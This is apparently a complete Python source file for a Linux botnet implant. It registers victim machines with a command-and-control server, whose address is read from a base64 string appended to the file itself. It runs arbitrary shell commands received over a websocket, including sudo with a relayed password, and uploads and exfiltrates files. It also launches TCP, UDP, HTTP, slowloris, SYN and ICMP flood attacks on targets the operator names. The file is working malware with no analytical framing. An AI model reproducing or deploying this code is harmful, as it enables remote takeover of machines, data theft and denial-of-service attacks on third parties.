#!/usr/bin/env python3
import asyncio
import json
import subprocess
import signal
import sys
import os
import base64
import socket
import random
import threading
import time
import uuid
import re
import platform
import netifaces
from websockets import connect
from websockets.exceptions import ConnectionClosedError, ConnectionClosedOK
from typing import List, Dict, Tuple, Optional
import requests
import shlex


class LinuxImpl:
    def __init__(self, c2_ws_url: str, group: str = "grupo"):
        self.c2_ws_url = c2_ws_url
        self.group = group
        self.current_dir = os.getcwd()
        self.upload_buffer = []
        self.upload_destination = None
        self.running = True
        self.attack_thread = None
        self.attacks = []
        self.retry_count = 0
        self.max_retry_delay = 300  

    async def run(self) -> None:
        
        while self.running:
            try:
                
                await self.register()
                await self._connect_to_c2()
                
                self.retry_count = 0
                
            except ConnectionClosedOK:
                await self._wait_before_retry()
                
            except (ConnectionClosedError, ConnectionRefusedError, TimeoutError) as e:
                await self._wait_before_retry()
                
            except Exception as e:
                await self._wait_before_retry()

    async def _wait_before_retry(self):
        self.retry_count += 1
        
        delay = min(5 * (2 ** (self.retry_count - 1)), self.max_retry_delay)
        await asyncio.sleep(delay)

    async def _connect_to_c2(self) -> None:
        try:
            
            async with connect(
                f"ws://{self.c2_ws_url}/api/rcv?id={self.impl_id}",
                ping_interval=20,
                ping_timeout=10,
                close_timeout=10,
                open_timeout=30
            ) as ws:
                self.retry_count = 0  
                
                
                while self.running:
                    try:
                        await self._handle_commands(ws)
                    except ConnectionClosedError:
                        raise
                    except Exception as e:
                        await asyncio.sleep(1)
                        
        except Exception as e:
            raise

    async def _handle_commands(self, ws) -> None:
        try:
            
            cmd = await asyncio.wait_for(ws.recv(), timeout=60)
            data = json.loads(cmd)

            if 'cmd' in data:
                await self._execute_command(ws, data['cmd'])
            elif 'chunk' in data:
                await self._handle_file_upload(ws, data)
            elif 'list_files' in data:
                await self._list_directory(ws, data.get('path', self.current_dir))
            elif 'get_files' in data:
                await self._send_file(ws, data['get_files'])
            elif 'attack' in data:
                await self._handle_attack_command(ws, data)
            elif 'stop_attack' in data:
                await self._stop_attack(ws, attack_type=data['stop_attack'])
        
        except asyncio.TimeoutError:
            
            pass
        except ConnectionClosedError:
            raise
        except Exception as e:
            try:
                await ws.send(json.dumps({"result": f"Error: {str(e)}"}))
            except:
                pass  

    async def _execute_command(self, ws, command: str) -> None:
        if command.startswith("cd "):
            await self._change_directory(ws, command[3:].strip())
            return

        if command.startswith("sudo"):
            await ws.send(json.dumps({"prompt": "sudo password: "}))
            msg = await ws.recv()
            data = json.loads(msg)           
            password = data['pass']

            args = shlex.split(command)
            if args[0] == "sudo" and args[1] != "su":
                args.insert(1, "-S")

            proc = subprocess.Popen(
                args,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            stdout, stderr = proc.communicate(password + '\n')
            output = stdout if stdout else stderr
        else:
            out, err, _ = self._execute_shell_command(command)
            output = out if out else err

        if not isinstance(output, str):
            output = str(output)
            
        output = output.replace("\r", "").rstrip()   
        await ws.send(json.dumps({
            "result": output,
            "cwd": self.current_dir
        }, ensure_ascii=False))

    async def _change_directory(self, ws, path: str) -> None:
        path = path.replace('"', '')
        if path == "..":
            self.current_dir = os.path.dirname(self.current_dir)
        else:
            new_path = os.path.abspath(os.path.join(self.current_dir, path))
            if os.path.isdir(new_path):
                self.current_dir = new_path
            else:
                await ws.send(json.dumps({
                    "error": f"Directory '{path}' doesn't exists.",
                    "cwd": self.current_dir
                }))
                return
        
        await ws.send(json.dumps({
            "result": "",
            "error": "",
            "cwd": self.current_dir
        }))
    
    def _execute_shell_command(self, command: str) -> Tuple[str, str, str]:
        try:
            result = subprocess.run(
                ['/bin/bash', '-c', f'cd "{self.current_dir}" && {command}'],
                capture_output=True, 
                text=True,
                timeout=60
            )
            
            return result.stdout, result.stderr, self.current_dir
        except subprocess.TimeoutExpired:
            return "", "Command has exceeded execution timeout", self.current_dir
    
    async def _handle_file_upload(self, ws, data: Dict) -> None:
        try:
            part = base64.b64decode(data['chunk']['data'])
            is_last = data['chunk'].get('last', False)
            
            self.upload_buffer.append(part)
            
            if self.upload_destination is None:
                self.upload_destination = data['destination']
            
            if is_last:
                with open(self.upload_destination, "wb") as f:
                    for chunk in self.upload_buffer:
                        f.write(chunk)
                
                
                self.upload_buffer.clear()
                self.upload_destination = None
                
                await ws.send(json.dumps({
                    "status": "upload_complete",
                    "message": f"Archivo recibido en {self.upload_destination}"
                }))
        
        except Exception as e:
            await ws.send(json.dumps({
                "status": "error",
                "message": str(e)
            }))
    
    async def _list_directory(self, ws, path: str) -> None:
        if not os.path.exists(path):
            await ws.send(json.dumps({
                "error": f"Ruta no encontrada: {path}"
            }))
            return
        
        items = []
        try:
            for name in os.listdir(path):
                full_path = os.path.join(path, name)
                try:
                    item_type = "directory" if os.path.isdir(full_path) else "file"
                    size = os.path.getsize(full_path) if item_type == "file" else 0
                    items.append({
                        "name": name,
                        "type": item_type,
                        "size": size,
                        "permissions": oct(os.stat(full_path).st_mode & 0o777)
                    })
                except Exception as e:
                    items.append({
                        "name": name,
                        "type": "unknown",
                        "size": 0,
                        "error": str(e)
                    })
            
            await ws.send(json.dumps({
                "items": items,
                "path": path,
                "status": "success"
            }))
        
        except Exception as e:
            await ws.send(json.dumps({
                "error": str(e),
                "status": "error"
            }))
    
    async def _send_file(self, ws, file_path: str) -> None:
        if not os.path.isfile(file_path):
            await ws.send(json.dumps({
                "error": f"Archivo no encontrado: {file_path}",
                "status": "error"
            }))
            return
        
        CHUNK_SIZE = 64 * 1024
        try:
            with open(file_path, "rb") as f:
                while True:
                    chunk = f.read(CHUNK_SIZE)
                    if not chunk:
                        break

                    encoded = base64.b64encode(chunk).decode("utf-8")
                    is_last = f.tell() == os.path.getsize(file_path)

                    await ws.send(json.dumps({
                        "filename": os.path.basename(file_path),
                        "path": file_path,
                        "chunk": encoded,
                        "last": is_last
                    }))
                    
                    await asyncio.sleep(0) 
            
        except Exception as e:
            await ws.send(json.dumps({
                "error": str(e),
                "status": "error"
            }))
    
    async def _handle_attack_command(self, ws, data: Dict) -> None:
        stop_thread = threading.Event()
        attack_type = data['attack']['type']
        target = data['attack']['target']
        duration = data['attack'].get('duration', 60)

        if len(self.attacks) == 0:
            loop = asyncio.get_event_loop()
            
            attack_thread = threading.Thread(
                target=self._execute_attack,
                args=(str(attack_type), str(target), int(duration), ws, loop, stop_thread),
                daemon=True
            )
            attack_thread.start()

            self.attacks.append({"type":attack_type, "thread": attack_thread, "stop_thread":stop_thread, "target":target, "loop":loop})
            
            await ws.send(json.dumps({
                "status": "attack_running",
                "attack_type": attack_type,
                "target": target
            }))
        else:
            for attack in self.attacks:
                if attack_type == attack['type']:
                    pass
                else:
                    loop = asyncio.get_event_loop()
                    
                    attack_thread = threading.Thread(
                        target=self._execute_attack,
                        args=(str(attack_type), str(target), int(duration), ws, loop, stop_thread),
                        daemon=True
                    )
                    attack_thread.start()

                    self.attacks.append({"type":attack_type, "thread": attack_thread, "stop_thread":stop_thread, "target":target, "loop":loop})

                    await ws.send(json.dumps({
                        "status": "attack_running",
                        "attack_type": attack_type,
                        "target": target
                    }))

                return
    
    def _execute_attack(self, attack_type: str, target: str, duration: int, ws, loop, stop_thread) -> None:
        end_time = time.time() + duration
        
        try:
            if attack_type == "tcp_flood":
                self._tcp_flood_attack(target, end_time, stop_thread)
            elif attack_type == "udp_flood":
                self._udp_flood_attack(target, end_time, stop_thread)
            elif attack_type == "http_flood":
                self._http_flood_attack(target, end_time, stop_thread)
            elif attack_type == "slowloris":
                self._slowloris_attack(target, end_time, stop_thread)
            elif attack_type == "syn_flood":
                self._syn_flood_attack(target, end_time, stop_thread)
            elif attack_type == "icmp_flood":
                self._icmp_flood_attack(target, end_time, stop_thread)
            else:
                pass
        except Exception as e:
            pass
        finally:
            asyncio.run_coroutine_threadsafe(
                self._notify_attack_completed(ws, attack_type, target),
                loop
            )
        
    async def _notify_attack_completed(self, ws, attack_type: str, target: str) -> None:
        try:
            await ws.send(json.dumps({
                "status": "attack_completed",
                "attack_type": attack_type,
                "target": target,
                "message": "Ataque completado"
            }))
        except Exception as e:
            pass

    
    def _tcp_flood_attack(self, target: str, end_time: float, stop_thread) -> None:
        target_ip, target_port = target.split(":")
        target_port = int(target_port)
        
        while time.time() < end_time and not stop_thread.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target_ip, target_port))
                s.send(random._urandom(1024))
                s.close()
            except:
                pass
    
    def _udp_flood_attack(self, target: str, end_time: float, stop_thread) -> None:
        target_ip, target_port = target.split(":")
        target_port = int(target_port)
        
        while time.time() < end_time and not stop_thread.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(random._urandom(1024), (target_ip, target_port))
                s.close()
            except:
                pass
    
    def _http_flood_attack(self, target: str, end_time: float, stop_thread) -> None:
        import urllib.request
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target  
        
        socket.setdefaulttimeout(5)  
        
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Accept': '*/*',
            'Connection': 'close'
        }
        
        request = urllib.request.Request(
            url=target,
            headers=headers,
            method='GET'
        )
        
        while time.time() < end_time and not stop_thread.is_set():
            try:
                with urllib.request.urlopen(request) as response:
                    response.read(64)  
                time.sleep(0.01)
            except urllib.error.URLError as e:
                break
            except Exception as e:
                time.sleep(1)  
    
    def _slowloris_attack(self, target: str, end_time: float, stop_thread) -> None:
        target_ip, target_port = target.split(":")
        target_port = int(target_port)
        sockets = []
        
        try:
            while time.time() < end_time and not stop_thread.is_set(): 
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target_ip, target_port))
                    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                    s.send("User-Agent: Mozilla/5.0\r\n".encode())
                    s.send("Accept-language: en-US,en,q=0.5\r\n".encode())
                    sockets.append(s)
                except:
                    self._close_sockets(sockets)
                    sockets = []
                for s in sockets:
                    try:
                        s.send("X-a: b\r\n".encode())
                    except:
                        sockets.remove(s)
                
                time.sleep(15)
        finally:
            self._close_sockets(sockets)
    
    def _syn_flood_attack(self, target: str, end_time: float, stop_thread) -> None:
        target_ip, target_port = target.split(":")
        target_port = int(target_port)
        
        while time.time() < end_time and not stop_thread.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                packet = b'\x00' * 64 
                s.sendto(packet, (target_ip, target_port))
                s.close()
            except:
                pass
    
    def _icmp_flood_attack(self, target: str, end_time: float, stop_thread) -> None:
        import os
        
        while time.time() < end_time and not stop_thread.is_set():
            try:
                if os.name == 'nt':
                    os.system(f"ping -n 1 -l 65500 {target} > nul")
            except:
                pass
    
    def _close_sockets(self, sockets: list) -> None:
        for s in sockets:
            try:
                s.close()
            except:
                pass
    
    async def _stop_attack(self, ws, attack_type) -> None:
        if len(attack_type) == 0:
            for attack in self.attacks[:]:
                attack['stop_thread'].set()
                attack['thread'].join(timeout=5)
                asyncio.run_coroutine_threadsafe(
                    self._notify_attack_completed(ws, attack_type, attack['target']),
                    attack['loop']
                )
                self.attacks.remove(attack)

        else:
            for attack in self.attacks:
                if attack['type'] == attack_type:
                    if attack['thread'].is_alive():
                        attack['stop_thread'].set()
                        attack['thread'].join(timeout=5)
                    self.attacks.remove(attack)
                    asyncio.run_coroutine_threadsafe(
                        self._notify_attack_completed(ws, attack_type, attack['target']),
                        attack['loop']
                    )
    
    async def register(self) -> bool:
        model = {
            'impl_mac': self._get_macs(),
            'group': self.group,
            'public_ip': self._get_public_ip(),
            'local_ip': self._get_local_ips(),
            'operating_system': self._get_operating_system(),
            'impl_id': self.impl_id
        }

        max_attempts = 3
        for attempt in range(max_attempts):
            try:
                req = requests.post(f"http://${self.c2_ws_url}/api/impl/new/{model['impl_id']}", 
                                   data=model, timeout=10)
                if req.status_code == 200:
                    return True
                else:
                    return False
            except Exception as e:
                return False 
            if attempt < max_attempts - 1:
                await asyncio.sleep(3)
        
        return False

    @property
    def impl_id(self) -> str:
        try:
            with open('/etc/machine-id', 'r') as f:
                machine_id = f.read().strip()
                if machine_id:
                    return machine_id
        except:
            pass
        
        try:
            macs = self._get_macs()
            if macs and macs[0] != 'undefined':
                return macs[0].replace(':', '')
        except:
            pass
        
        return str(uuid.uuid4())
    
    def _get_macs(self) -> List[str]:
        try:
            macs = []
            for interface in netifaces.interfaces():
                addr = netifaces.ifaddresses(interface)
                if netifaces.AF_LINK in addr:
                    mac = addr[netifaces.AF_LINK][0].get('addr')
                    if mac and mac != '00:00:00:00:00:00':
                        macs.append(mac)
            return macs if macs else ['undefined']
        except:
            return ['undefined']
    
    def _get_local_ips(self) -> List[str]:
        try:
            ips = []
            for interface in netifaces.interfaces():
                addr = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addr:
                    ip = addr[netifaces.AF_INET][0].get('addr')
                    if ip and not ip.startswith('127.'):
                        ips.append(ip)
            return ips if ips else ['undefined']
        except:
            return ['undefined']
    
    def _get_public_ip(self) -> str:
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            return response.text.strip() if response.status_code == 200 else "undefined"
        except:
            return "undefined"
    
    def _get_operating_system(self) -> str:
        try:
            with open('/etc/os-release', 'r') as f:
                for line in f:
                    if line.startswith('PRETTY_NAME='):
                        return line.split('=')[1].strip().strip('"')
        except:
            pass
        
        return f"{platform.system()} {platform.release()}"
    
    def _def_handler(self, sig, frame) -> None:
        self.running = False
        sys.exit(1)

if __name__ == "__main__":

    impl_path = os.path.abspath(sys.argv[0])
    pyl = ""
    with open(impl_path, "rb") as f:
        f.seek(-2, 2)
        while f.read(1) != b"\n":
            f.seek(-2, 1)
        pyl = f.readline().strip().decode(errors="ignore").split(" ")[-1].split('DATA=')[1]
    
    
    pyl = base64.b64decode(pyl.strip()).decode('utf-8').split('|')
    
    url = pyl[1]
    port = pyl[2]
    group = pyl[3]

    C2_WS_URL = f"{url}:{port}"
    
    impl = LinuxImpl(c2_ws_url=C2_WS_URL, group=group)
    
    def signal_handler(sig, frame):
        impl.running = False
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    try:
        asyncio.run(impl.run())
    except KeyboardInterrupt:
        impl.running = False
    except Exception as e:
        raise        
